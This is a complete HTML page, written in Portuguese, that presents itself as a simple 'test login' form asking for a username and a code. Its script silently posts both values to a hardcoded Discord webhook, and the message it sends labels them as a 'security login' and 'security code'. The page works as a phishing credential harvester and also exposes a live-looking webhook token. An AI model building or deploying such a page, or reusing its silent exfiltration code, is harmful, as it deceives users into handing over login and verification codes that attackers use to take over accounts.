<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login de Teste</title>

  <style>
    * {
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #f5f5f5, #e8e8e8);
    }

    .caixa {
      width: 90%;
      max-width: 350px;
      background: white;
      padding: 35px 30px;
      border-radius: 18px;
      box-shadow: 0 8px 30px rgba(0,0,0,.12);
      text-align: center;
    }

    h1 {
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 12px;
      border: 1px solid #ddd;
      border-radius: 9px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 14px;
      border: 0;
      border-radius: 9px;
      background: #1877f2;
      color: white;
      font-size: 16px;
      font-weight: bold;
    }

    #resultado {
      margin-top: 15px;
    }
  </style>
</head>

<body>

<div class="caixa">
  <h1>Login de Teste</h1>

  <input id="nome" type="text" placeholder="Nome de utilizador">
  <input id="codigo" type="text" placeholder="Código de teste">

  <button onclick="enviar()">Entrar</button>

  <p id="resultado"></p>
</div>

<script>
async function enviar() {
  const nome = document.getElementById("nome").value;
  const codigo = document.getElementById("codigo").value;

  const webhook = "https://discord.com/api/webhooks/1530994371229519973/0ENW9_YGV8kuyLh56KX8TcsmWH-o7xk7ZGTMs1A2jwM2f2DSwjoBgB-X7GQq99UvVbA2";

  const mensagem = {
    content:
      "**LOGIN DE SEGURANÇA**\n" +
      "Nome: " + nome + "\n" +
      "Código DE SEGURANÇA: " + codigo
  };

  try {
    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(mensagem)
    });

    document.getElementById("resultado").textContent =
      "OBRIGADO!";
  } catch (erro) {
    document.getElementById("resultado").textContent =
      "Erro ao enviar.";
  }
}
</script>

</body>
</html>
